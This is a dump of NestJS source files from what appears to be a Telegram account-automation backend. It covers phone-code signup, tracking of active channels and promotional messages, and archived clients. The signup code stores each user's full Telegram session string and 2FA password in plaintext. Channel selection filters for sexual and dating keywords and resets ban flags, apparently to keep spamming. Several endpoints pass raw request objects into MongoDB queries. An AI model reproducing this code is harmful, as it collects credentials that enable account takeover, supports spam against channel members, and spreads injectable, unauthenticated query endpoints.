throw new BadRequestException('2FA password required');\r\n        }\r\n    }\r\n\r\n    private async handleNewUserRegistration(\r\n        phone: string,\r\n        client: TelegramClient,\r\n        phoneCodeHash: string\r\n    ): Promise<TgSignupResponse> {\r\n        try {\r\n            const randomName = `User${Math.random().toString(36).substring(2, 8)}`;\r\n            const signUpResult = await client.invoke(\r\n                new Api.auth.SignUp({\r\n                    phoneNumber: phone,\r\n                    phoneCodeHash,\r\n                    firstName: randomName,\r\n                    lastName: '', // Keep empty for privacy\r\n                })\r\n            ) as Api.auth.Authorization;\r\n\r\n            if (!signUpResult || !signUpResult.user) {\r\n                throw new BadRequestException('Invalid response from Telegram server');\r\n            }\r\n\r\n            const sessionString = client.session.save() as unknown as string;\r\n            if (!sessionString) {\r\n                throw new Error('Failed to generate session string');\r\n            }\r\n\r\n            return await this.processLoginResult(signUpResult.user, sessionString);\r\n        } catch (error) {\r\n            const errorDetails = parseError(error, \"TGSIGNUP\", false);\r\n            this.logger.error(`Failed to register new user: ${errorDetails.message}`);\r\n            throw new BadRequestException(errorDetails.message || 'Failed to register new user');\r\n        }\r\n    }\r\n\r\n    private async processLoginResult(user: any, sessionString: string, password?: string): Promise<TgSignupResponse> {\r\n        try {\r\n            if (!user || !sessionString) {\r\n                throw new Error('Invalid user data or session string');\r\n            }\r\n\r\n            // Add additional user metadata\r\n            const now = new Date();\r\n            const userData: CreateUserDto = {\r\n                mobile: user.phone?.toString()?.replace(/^\\+/, '') || '',\r\n                session: sessionString,\r\n                firstName: user.firstName || '',\r\n                lastName: user.lastName || '',\r\n                username: user.username || '',\r\n                tgId: user.id?.toString() || '',\r\n                twoFA: !!password,\r\n                password: password || null,\r\n                lastActive: now.toISOString().split('T')[0],\r\n                expired: false,\r\n                channels: 0,\r\n                personalChats: 0,\r\n                totalChats: 0,\r\n                otherPhotoCount: 0,\r\n                ownPhotoCount: 0,\r\n                ownVideoCount: 0,\r\n                otherVideoCount: 0,\r\n                recentUsers: [],\r\n                calls: {\r\n                    chatCallCounts: [],\r\n                    incoming: 0,\r\n                    outgoing: 0,\r\n                    totalCalls: 0,\r\n                    video: 0,\r\n                },\r\n                contacts: 0,\r\n                movieCount: 0,\r\n                msgs: 0,\r\n                photoCount: 0,\r\n                videoCount: 0,\r\n                gender: 'unknown',\r\n            };\r\n\r\n            // Validate required fields\r\n            if (!userData.mobile || !userData.tgId) {\r\n                throw new Error('Invalid user data received from Telegram');\r\n            }\r\n\r\n            await this.usersService.create(userData);\r\n            return {\r\n                status: 200,\r\n                message: 'Registration successful',\r\n                session: sessionString,\r\n            };\r\n        } catch (error) {\r\n            this.logger.error('Error processing login result:', error);\r\n            if (error instanceof BadRequestException) {\r\n                throw error;\r\n            }\r\n            throw new InternalServerErrorException('Failed to complete registration');\r\n        }\r\n    }\r\n}\r\n","import { ApiProperty } from '@nestjs/swagger';\r\nimport { Transform } from 'class-transformer';\r\nimport { IsString, IsNotEmpty, IsOptional, Matches, MinLength } from 'class-validator';\r\n\r\nexport class SendCodeDto {\r\n    @ApiProperty({\r\n        description: 'Phone number to send the verification code to (international format)',\r\n        example: '+919876543210'\r\n    })\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    @Matches(/^\\+\\d{8,15}$/, { message: 'Invalid phone number format' })\r\n    phone: string;\r\n}\r\n\r\nexport class VerifyCodeDto {\r\n    @ApiProperty({\r\n        description: 'Phone number used for verification (international format)',\r\n        example: '919876543210'\r\n    })\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    @Matches(/^\\+\\d{8,15}$/, { message: 'Invalid phone number format' })\r\n    phone: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Verification code received',\r\n        example: '12345'\r\n    })\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    @Matches(/^\\d{5}$/, { message: 'Code must be exactly 5 digits' })\r\n    code: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Two-factor authentication password if required',\r\n        example: 'yourSecurePassword123',\r\n        required: false\r\n    })\r\n    @IsString()\r\n    @IsOptional()\r\n    @Transform(({ value }) => value === '' ? undefined : value)\r\n    password?: string | undefined;\r\n\r\n}\r\n\r\nexport class TgSignupResponse {\r\n    @ApiProperty({\r\n        description: 'Operation status code',\r\n        example: 200\r\n    })\r\n    status: number;\r\n\r\n    @ApiProperty({\r\n        description: 'Response message',\r\n        example: 'Login successful'\r\n    })\r\n    message: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Phone code hash for verification',\r\n        example: 'abc123xyz',\r\n        required: false\r\n    })\r\n    phoneCodeHash?: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Whether the code was sent via app',\r\n        example: true,\r\n        required: false\r\n    })\r\n    isCodeViaApp?: boolean;\r\n\r\n    @ApiProperty({\r\n        description: 'Session string for authenticated client',\r\n        required: false\r\n    })\r\n    session?: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Whether 2FA is required',\r\n        example: false,\r\n        required: false\r\n    })\r\n    requires2FA?: boolean;\r\n}","import { Controller, Post, Body, Logger, HttpStatus } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiResponse, ApiExtraModels } from '@nestjs/swagger';\r\nimport { TgSignupService } from './TgSignup.service';\r\nimport { SendCodeDto, VerifyCodeDto, TgSignupResponse } from './dto/tg-signup.dto';\r\nimport { parseError } from '../../utils/parseError';\r\n\r\n@Controller('tgsignup')\r\n@ApiTags('tgsignup')\r\n@ApiExtraModels(SendCodeDto, VerifyCodeDto, TgSignupResponse)\r\nexport class TgSignupController {\r\n    private readonly logger = new Logger(TgSignupController.name);\r\n\r\n    constructor(private readonly tgSignupService: TgSignupService) {}\r\n\r\n    @Post('send-code')\r\n    @ApiOperation({\r\n        summary: 'Send verification code to phone number',\r\n        description: 'Initiates the signup process by sending a verification code via Telegram'\r\n    })\r\n    @ApiResponse({\r\n        status: HttpStatus.CREATED,\r\n        type: TgSignupResponse,\r\n        description: 'Code sent successfully'\r\n    })\r\n    @ApiResponse({\r\n        status: HttpStatus.BAD_REQUEST,\r\n        description: 'Invalid phone number or failed to send code',\r\n        schema: {\r\n            type: 'object',\r\n            properties: {\r\n                statusCode: { type: 'number', example: 400 },\r\n                message: { type: 'string', example: 'Invalid phone number format' },\r\n                error: { type: 'string', example: 'Bad Request' }\r\n            }\r\n        }\r\n    })\r\n    @ApiResponse({\r\n        status: HttpStatus.TOO_MANY_REQUESTS,\r\n        description: 'Rate limit exceeded'\r\n    })\r\n    @ApiResponse({\r\n        status: HttpStatus.INTERNAL_SERVER_ERROR,\r\n        description: 'Internal server error occurred'\r\n    })\r\n    async sendCode(@Body() sendCodeDto: SendCodeDto): Promise<TgSignupResponse> {\r\n        try {\r\n            this.logger.debug(`[SEND_CODE] Request received for phone: ${sendCodeDto.phone}`);\r\n            const result = await this.tgSignupService.sendCode(sendCodeDto.phone);\r\n\r\n            return {\r\n                status: HttpStatus.CREATED,\r\n                message: 'Code sent to your Telegram App',\r\n                phoneCodeHash: result.phoneCodeHash,\r\n                isCodeViaApp: result.isCodeViaApp\r\n            };\r\n        } catch (error) {\r\n            this.logger.error(`[SEND_CODE] Error for phone: ${sendCodeDto.phone}`, {\r\n                error,\r\n                stack: error.stack\r\n            });\r\n\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    @Post('verify')\r\n    @ApiOperation({\r\n        summary: 'Verify code and complete signup/login',\r\n        description: 'Verifies the code sent to phone and completes the signup/login process'\r\n    })\r\n    @ApiResponse({\r\n        status: HttpStatus.OK,\r\n        type: TgSignupResponse,\r\n        description: 'Verification successful'\r\n    })\r\n    @ApiResponse({\r\n        status: HttpStatus.BAD_REQUEST,\r\n        description: 'Invalid code or verification failed'\r\n    })\r\n    @ApiResponse({\r\n        status: HttpStatus.TOO_MANY_REQUESTS,\r\n        description: 'Rate limit exceeded'\r\n    })\r\n    @ApiResponse({\r\n        status: HttpStatus.INTERNAL_SERVER_ERROR,\r\n        description: 'Internal server error occurred'\r\n    })\r\n    async verifyCode(@Body() verifyCodeDto: VerifyCodeDto): Promise<TgSignupResponse> {\r\n        try {\r\n            this.logger.debug(`[VERIFY_CODE] Request received for phone: ${verifyCodeDto.phone}`);\r\n\r\n            const result = await this.tgSignupService.verifyCode(\r\n                verifyCodeDto.phone,\r\n                verifyCodeDto.code,\r\n                verifyCodeDto.password\r\n            );\r\n\r\n            return {\r\n                status: result.requires2FA ? HttpStatus.BAD_REQUEST : HttpStatus.OK,\r\n                message: result.message || 'Successfully logged in',\r\n                session: result.session,\r\n                requires2FA: result.requires2FA\r\n            };\r\n        } catch (error) {\r\n            this.logger.error(`[VERIFY_CODE] Error for phone: ${verifyCodeDto.phone}`, {\r\n                error,\r\n                stack: error.stack\r\n            });\r\n\r\n            throw error;\r\n        }\r\n    }\r\n}\r\n","// src/activechannels/activechannels.controller.ts\nimport { Controller, Get, Post, Body, Patch, Param, Delete, NotFoundException, Query, BadRequestException } from '@nestjs/common';\nimport { ActiveChannelsService } from './active-channels.service';\nimport { CreateActiveChannelDto } from './dto/create-active-channel.dto';\nimport { UpdateActiveChannelDto } from './dto/update-active-channel.dto';\nimport { ApiTags, ApiOperation, ApiResponse, ApiQuery, ApiBody } from '@nestjs/swagger';\nimport { ActiveChannel } from './schemas/active-channel.schema';\nimport { AddReactionDto } from './dto/add-reaction.dto';\n\n@ApiTags('Active Channels')\n@Controller('active-channels')\nexport class ActiveChannelsController {\n  constructor(private readonly activeChannelsService: ActiveChannelsService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create a new active channel' })\n  async create(@Body() createActiveChannelDto: CreateActiveChannelDto) {\n    return this.activeChannelsService.create(createActiveChannelDto);\n  }\n\n  @Post('createMultiple')\n  @ApiOperation({ summary: 'Create multiple channels' })\n  @ApiBody({ type: [CreateActiveChannelDto] })\n  async createMultiple(@Body() createChannelDtos: CreateActiveChannelDto[]): Promise<string> {\n    return this.activeChannelsService.createMultiple(createChannelDtos);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search channels by filters' })\n  @ApiQuery({ name: 'channelId', required: false, type: String })\n  @ApiQuery({ name: 'broadcast', required: false, type: Boolean })\n  @ApiQuery({ name: 'canSendMsgs', required: false, type: Boolean })\n  @ApiQuery({ name: 'participantsCount', required: false, type: Number })\n  @ApiQuery({ name: 'restricted', required: false, type: Boolean })\n  @ApiQuery({ name: 'sendMessages', required: false, type: Boolean })\n  @ApiQuery({ name: 'title', required: false, type: String })\n  @ApiQuery({ name: 'username', required: false, type: String })\n  @ApiQuery({ name: 'wordRestriction', required: false, type: Number })\n  @ApiQuery({ name: 'dMRestriction', required: false, type: Number })\n  @ApiQuery({ name: 'availableMsgs', required: false, type: [String] })\n  @ApiQuery({ name: 'reactions', required: false, type: [String] })\n  @ApiQuery({ name: 'banned', required: false, type: Boolean })\n  @ApiQuery({ name: 'reactRestricted', required: false, type: Boolean })\n  @ApiQuery({ name: 'megagroup', required: false, type: Boolean })\n  search(@Query() query: any): Promise<ActiveChannel[]> {\n    return this.activeChannelsService.search(query);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all active channels' })\n  async findAll() {\n    return this.activeChannelsService.findAll();\n  }\n\n  @Get(':channelId')\n  @ApiOperation({ summary: 'Get an active channel by channelId' })\n  //@apiresponse({ status: 200, description: 'Return the active channel', type: ActiveChannel })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async findOne(@Param('channelId') channelId: string) {\n    return this.activeChannelsService.findOne(channelId);\n  }\n\n  @Patch(':channelId')\n  @ApiOperation({ summary: 'Update an active channel by channelId' })\n  //@apiresponse({ status: 200, description: 'The channel has been successfully updated.', type: ActiveChannel })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async update(@Param('channelId') channelId: string, @Body() updateActiveChannelDto: UpdateActiveChannelDto) {\n    return this.activeChannelsService.update(channelId, updateActiveChannelDto);\n  }\n\n  @Delete(':channelId')\n  @ApiOperation({ summary: 'Delete an active channel by channelId' })\n  //@apiresponse({ status: 200, description: 'The channel has been successfully deleted.' })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async remove(@Param('channelId') channelId: string) {\n    return this.activeChannelsService.remove(channelId);\n  }\n\n  @Post(':channelId/reactions')\n  @ApiOperation({ summary: 'Add reaction to chat group' })\n  addReaction(@Param('channelId') channelId: string, @Body() addReactionDto: AddReactionDto): Promise<ActiveChannel> {\n    if (!addReactionDto.reactions) {\n      throw new BadRequestException('Reaction is required');\n    }\n    return this.activeChannelsService.addReactions(channelId, addReactionDto.reactions);\n  }\n\n  @Get(':channelId/reactions/random')\n  @ApiOperation({ summary: 'Get a random reaction from chat group' })\n  getRandomReaction(@Param('channelId') channelId: string): Promise<string> {\n    return this.activeChannelsService.getRandomReaction(channelId);\n  }\n\n  @Delete(':channelId/reactions')\n  @ApiOperation({ summary: 'Remove reaction from chat group' })\n  removeReaction(@Param('channelId') channelId: string, @Body() addReactionDto: AddReactionDto): Promise<ActiveChannel> {\n    if (!addReactionDto.reactions) {\n      throw new BadRequestException('Reaction is required');\n    }\n    return this.activeChannelsService.removeReaction(channelId, addReactionDto.reactions[0]);\n  }\n}\n","// src/activechannels/activechannels.module.ts\nimport { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { ActiveChannelsService } from './active-channels.service';\nimport { ActiveChannelsController } from './active-channels.controller';\nimport { ActiveChannel, ActiveChannelSchema } from './schemas/active-channel.schema';\nimport { initModule } from '../ConfigurationInit/init.module';\nimport { PromoteMsgModule } from '../promote-msgs/promote-msgs.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: ActiveChannel.name, schema: ActiveChannelSchema }]),\n    PromoteMsgModule\n  ],\n  controllers: [ActiveChannelsController],\n  providers: [ActiveChannelsService],\n  exports: [ActiveChannelsService]\n})\nexport class ActiveChannelsModule { }\n","import { PromoteMsgsService } from './../promote-msgs/promote-msgs.service';\n// src/activechannels/activechannels.service.ts\nimport { BadRequestException, Inject, Injectable, InternalServerErrorException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateActiveChannelDto } from './dto/create-active-channel.dto';\nimport { UpdateActiveChannelDto } from './dto/update-active-channel.dto';\nimport { ActiveChannel, ActiveChannelDocument } from './schemas/active-channel.schema';\nimport { parseError } from '../../utils/parseError';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\n\n@Injectable()\nexport class ActiveChannelsService {\n  constructor(\n    @InjectModel(ActiveChannel.name) private activeChannelModel: Model<ActiveChannelDocument>,\n    @Inject(forwardRef(() => PromoteMsgsService))\n    private promoteMsgsService: PromoteMsgsService\n  ) {}\n\n  async create(createActiveChannelDto: CreateActiveChannelDto): Promise<ActiveChannel> {\n    createActiveChannelDto.availableMsgs = Object.keys(await this.promoteMsgsService.findOne())\n    const createdChannel = new this.activeChannelModel(createActiveChannelDto);\n    return createdChannel.save();\n  }\n\n  \n  async createMultiple(createChannelDtos: CreateActiveChannelDto[]): Promise<string> {\n    const bulkOps = createChannelDtos.map((dto) => ({\n      updateOne: {\n        filter: { channelId: dto.channelId },\n        update: { $set: dto },\n        upsert: true\n      }\n    }));\n\n    await this.activeChannelModel.bulkWrite(bulkOps, { ordered: false });\n    return 'Channels Saved';\n  }\n\n  async findAll(): Promise<ActiveChannel[]> {\n    return this.activeChannelModel.find().exec();\n  }\n\n  async findOne(channelId: string): Promise<ActiveChannel> {\n    const channel = (await this.activeChannelModel.findOne({ channelId }).exec())?.toJSON();\n    return channel;\n  }\n\n  async update(channelId: string, updateActiveChannelDto: UpdateActiveChannelDto): Promise<ActiveChannel> {\n    delete updateActiveChannelDto[\"_id\"]\n    const updatedChannel = await this.activeChannelModel.findOneAndUpdate(\n      { channelId },\n      { $set: updateActiveChannelDto },\n      { new: true, upsert: true },\n    ).exec();\n    return updatedChannel;\n  }\n\n  async removeFromAvailableMsgs(channelId: string, msg: string) {\n    return await this.activeChannelModel.findOneAndUpdate({ channelId }, { $pull: { availableMsgs: msg } })\n  }\n\n  async addToAvailableMsgs(channelId: string, msg: string) {\n    return await this.activeChannelModel.findOneAndUpdate({ channelId }, { $addToSet: { availableMsgs: msg } })\n  }\n\n  async remove(channelId: string): Promise<void> {\n    const result = await this.activeChannelModel.findOneAndDelete({ channelId }).exec();\n  }\n\n  async search(filter: any): Promise<ActiveChannel[]> {\n    console.log(filter)\n    return this.activeChannelModel.find(filter).exec();\n  }\n\n  async addReactions(channelId: string, reactions: string[]): Promise<ActiveChannel> {\n    const channel = await this.activeChannelModel.findOneAndUpdate({ channelId }, {\n      $addToSet: { reactions: reactions }\n    })\n    return channel;\n  }\n\n  async getRandomReaction(channelId: string): Promise<string> {\n    const channel = (await this.activeChannelModel.findOne({ channelId }).exec())?.toJSON();\n    if (!channel) {\n      return undefined;\n    }\n    if (channel.reactions.length === 0) {\n      return undefined;\n    }\n    const randomIndex = Math.floor(Math.random() * channel.reactions.length);\n    return channel.reactions[randomIndex];\n  }\n\n  async removeReaction(channelId: string, reaction: string): Promise<ActiveChannel> {\n    const channel = await this.activeChannelModel.findOneAndUpdate({ channelId }, {\n      $pull: { reactions: reaction },\n    })\n    return channel;\n  }\n\n  async getActiveChannels(limit = 50, skip = 0, notIds = []) {\n    const query = {\n      '$and':\n        [\n          {\n            '$or':\n              [\n                { title: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\n                { username: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\n              ]\n          },\n          {\n            '$or': [\n              { title: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },\n              { username: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },\n            ]\n          },\n          {\n            channelId: { '$nin': notIds },\n            participantsCount: { $gt: 600 },\n            username: {$ne: null},\n            canSendMsgs: true,\n            restricted: false,\n            forbidden: false\n          }\n        ]\n    }\n\n    const sort: Record<string, 1 | -1> = { participantsCount: -1 }\n    try {\n      const result: ActiveChannel[] = await this.activeChannelModel.aggregate([\n        { $match: query },\n        { $skip: skip },\n        { $limit: limit },\n        { $sort: sort }, // Sort by the random field\n        { $project: { randomField: 0 } } // Remove the random field from the output\n      ]).exec();\n      return result;\n    } catch (error) {\n      console.error('Error:', error);\n      return [];\n    }\n  }\n  async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<ActiveChannel[]> {\n    try {\n      if (!query) {\n        throw new BadRequestException('Query is invalid.');\n      }\n      const queryExec = this.activeChannelModel.find(query);\n\n      if (sort) {\n        queryExec.sort(sort);\n      }\n\n      if (limit) {\n        queryExec.limit(limit);\n      }\n\n      if (skip) {\n        queryExec.skip(skip);\n      }\n\n      return await queryExec.exec();\n    } catch (error) {\n      throw new InternalServerErrorException(error.message);\n    }\n  }\n\n  async resetWordRestrictions() {\n    await fetchWithTimeout(`${notifbot()}&text=Request Received for Reset Available Msgs`);\n    try {\n      await this.activeChannelModel.updateMany({\n        banned: false\n      }, {\n        $set: {\n          \"wordRestriction\": 0,\n          \"dMRestriction\": 0\n        }\n      })\n    } catch (e) {\n      console.log(parseError(e))\n    }\n  }\n\n  async resetAvailableMsgs() {\n    await fetchWithTimeout(`${notifbot()}&text=Request Received for Reset Available Msgs`);\n    try {\n      const data = await this.promoteMsgsService.findOne();\n      const keys = Object.keys(data);\n      await this.activeChannelModel.updateMany(\n        {\n          $expr: {\n            $lt: [{ $size: { $ifNull: [\"$availableMsgs\", []] } }, 5]\n          }\n        },\n        {\n          $set: {\n            \"wordRestriction\": 0,\n            \"dMRestriction\": 0,\n            \"banned\": false,\n            \"availableMsgs\": keys\n          }\n        }\n      );\n    } catch (e) {\n      console.log(parseError(e))\n    }\n  }\n\n  async updateBannedChannels() {\n    await fetchWithTimeout(`${notifbot()}&text=Request Received for update banned Channels`);\n    await this.activeChannelModel.updateMany({ $or: [{ banned: true }, { private: true }] }, {\n      $set: {\n        \"wordRestriction\": 0,\n        \"dMRestriction\": 0,\n        banned: false,\n        \"private\": false\n      }\n    })\n  }\n\n  async updateDefaultReactions() {\n    await this.activeChannelModel.updateMany({}, {\n      $set: {\n        reactions: [\n          '', '', '', '', '', '',\n          '', '', '', '', '', '',\n          '', '', '', '', '', '',\n          '', '', '', '', '', '',\n          '', '', '', '', '', '',\n          '', '', '', '', '', '',\n          '', '', '', '', '',\n          '', '', '', '', ''\n        ]\n      }\n    })\n  }\n}\n","import { ApiProperty,  } from '@nestjs/swagger';\n\nexport class AddReactionDto  {\n    @ApiProperty({required: true})\n    reactions: string[]\n}\n","// src/activechannels/dto/create-activechannel.dto.ts\nimport { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateActiveChannelDto {\n  @ApiProperty()\n  channelId: string;\n\n  @ApiProperty({ default: false })\n  broadcast: boolean;\n\n  @ApiProperty({ default: true })\n  canSendMsgs: boolean;\n\n  @ApiProperty({ default: 300 })\n  participantsCount: number;\n\n  @ApiProperty({ default: false })\n  restricted: boolean;\n\n  @ApiProperty({ default: true })\n  sendMessages: boolean;\n\n  @ApiProperty({ default: false })\n  reactRestricted?: boolean = false;\n\n  @ApiProperty()\n  title: string;\n\n  @ApiProperty()\n  username: string;\n\n  @ApiProperty({ default: 0 })\n  wordRestriction?: number = 0;\n\n  @ApiProperty({ default: 0 })\n  dMRestriction?: number = 0;\n\n  @ApiProperty({ type: [String] })\n  availableMsgs?: string[];\n\n  @ApiProperty({\n    type: [String], default: [\n      '', '', '', '', '', '',\n      '', '', '', '', '', '',\n      '', '', '', '', '', '',\n      '', '', '', '', '', '',\n      '', '', '', '', '', '',\n      '', '', '', '', '', '',\n      '', '', '', '', '',\n      '', '', '', '', ''\n    ]\n  })\n  reactions?: string[] = [\n    '', '', '', '', '', '',\n    '', '', '', '', '', '',\n    '', '', '', '', '', '',\n    '', '', '', '', '', '',\n    '', '', '', '', '', '',\n    '', '', '', '', '', '',\n    '', '', '', '', '',\n    '', '', '', '', ''\n  ];\n\n  @ApiProperty({ default: false })\n  banned?: boolean = false;\n\n  @ApiProperty({ default: true, required: false })\n  megagroup?: boolean;\n\n  @ApiProperty({ default: false, required: false })\n  forbidden?: boolean\n\n  @ApiProperty({\n    description: 'Whether the channel is private',\n    example: false,\n    required: false,\n  })\n  private: boolean = false;\n}\n","// src/activechannels/dto/update-activechannel.dto.ts\nimport { PartialType } from '@nestjs/swagger';\nimport { CreateActiveChannelDto } from './create-active-channel.dto';\n\nexport class UpdateActiveChannelDto extends PartialType(CreateActiveChannelDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\nimport * as mongoose from 'mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { defaultMessages, defaultReactions } from '../../../utils';\n\nexport type ActiveChannelDocument = ActiveChannel & Document;\n\n@Schema({ collection: 'activeChannels', versionKey: false, autoIndex: true,\n  timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n })\nexport class ActiveChannel {\n  @ApiProperty({ required: true })\n  @Prop({ required: true, unique: true })\n  channelId: string;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  broadcast: boolean;\n\n  @ApiProperty({ default: true })\n  @Prop({ default: true })\n  canSendMsgs: boolean;\n\n  @ApiProperty({ type: Number, default: 0 })\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\n  participantsCount: number;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  restricted: boolean;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  sendMessages: boolean;\n\n  @ApiProperty({ required: true })\n  @Prop({ required: true })\n  title: string;\n\n  @ApiProperty({ required: false, default: null })\n  @Prop({ required: false, default: null })\n  username: string;\n\n  @ApiProperty({ type: Number, default: 0 })\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\n  wordRestriction: number;\n\n  @ApiProperty({ type: Number, default: 0 })\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\n  dMRestriction: number;\n\n  @ApiProperty({ type: [String], default:defaultMessages })\n  @Prop({ type: [String], default: defaultMessages })\n  availableMsgs: string[];\n\n  @ApiProperty({ type: [String], default: defaultReactions })\n  @Prop({\n    type: [String], default: defaultReactions\n  })\n  reactions: string[];\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  banned: boolean;\n\n  @ApiProperty({ default: true })\n  @Prop({ default: true })\n  megagroup: boolean;\n\n  @ApiProperty({ default: false})\n  @Prop({ default: false })\n  private: boolean;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  reactRestricted: boolean\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  forbidden: boolean\n}\n\nexport const ActiveChannelSchema = SchemaFactory.createForClass(ActiveChannel);\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody, ApiQuery } from '@nestjs/swagger';\nimport { Client } from '../clients/schemas/client.schema';\nimport { ArchivedClientService } from './archived-client.service';\nimport { CreateClientDto } from '../clients/dto/create-client.dto';\nimport { SearchClientDto } from '../clients/dto/search-client.dto';\nimport { UpdateClientDto } from '../clients/dto/update-client.dto';\n\n@ApiTags('Archived Clients')\n@Controller('archived-clients')\nexport class ArchivedClientController {\n  constructor(private readonly archivedclientService: ArchivedClientService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create user data' })\n  //@apiresponse({ status: 201, description: 'The user data has been successfully created.' })\n  //@apiresponse({ status: 403, description: 'Forbidden.' })\n  async create(@Body() createClientDto: CreateClientDto): Promise<Client> {\n    return this.archivedclientService.create(createClientDto);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search user data' })\n  @ApiQuery({ name: 'clientId', required: false, description: 'Client ID' })\n  @ApiQuery({ name: 'dbcoll', required: false, description: 'Database collection name' })\n  @ApiQuery({ name: 'channelLink', required: false, description: 'Channel link' })\n  @ApiQuery({ name: 'link', required: false, description: 'Client link' })\n  async search(@Query() query: SearchClientDto): Promise<Client[]> {\n    return this.archivedclientService.search(query);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all user data' })\n  //@apiresponse({ status: 200, description: 'Return all user data.' })\n  //@apiresponse({ status: 403, description: 'Forbidden.' })\n  async findAll(): Promise<Client[]> {\n    return this.archivedclientService.findAll();\n  }\n  \n  @Get('checkArchivedClients')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  //@apiresponse({ status: 200, description: 'Return the user data.' })\n  //@apiresponse({ status: 404, description: 'User data not found.' })\n  async checkArchivedClients(): Promise<string> {\n    return this.archivedclientService.checkArchivedClients();\n  }\n\n  @Get(':mobile')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  //@apiresponse({ status: 200, description: 'Return the user data.' })\n  //@apiresponse({ status: 404, description: 'User data not found.' })\n  async findOne(@Param('mobile') mobile: string): Promise<Client> {\n    return this.archivedclientService.findOne(mobile);\n  }\n  \n  @Get('fetchOne/:mobile')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  //@apiresponse({ status: 200, description: 'Return the user data.' })\n  //@apiresponse({ status: 404, description: 'User data not found.' })\n  async fetchOne(@Param('mobile') mobile: string): Promise<Client> {\n    return this.archivedclientService.fetchOne(mobile);\n  }\n\n  @Patch(':mobile')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  //@apiresponse({ status: 200, description: 'The user data has been successfully updated.' })\n  //@apiresponse({ status: 404, description: 'User data not found.' })\n  async update(@Param('mobile') mobile: string, @Body() updateClientDto: UpdateClientDto): Promise<Client> {\n    return this.archivedclientService.update(mobile, updateClientDto);\n  }\n\n  @Delete(':mobile')\n  @ApiOperation({ summary: 'Delete user data by ID' })\n  //@apiresponse({ status: 200, description: 'The user data has been successfully deleted.' })\n  //@apiresponse({ status: 404, description: 'User data not found.' })\n  async remove(@Param('mobile') mobile: string): Promise<Client> {\n    return this.archivedclientService.remove(mobile);\n  }\n\n  @Post('query')\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\n  //@apiresponse({ status: 200, description: 'Query executed successfully.' })\n  //@apiresponse({ status: 400, description: 'Invalid query.' })\n  //@apiresponse({ status: 500, description: 'Internal server error.' })\n  @ApiBody({type: Object})\n  async executeQuery(@Body() query: object): Promise<any> {\n    try {\n      return await this.archivedclientService.executeQuery(query);\n    } catch (error) {\n      throw error;  // You might want to handle errors more gracefully\n    }\n  }\n}\n","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { ClientSchema } from '../clients/schemas/client.schema';\nimport { TelegramModule } from 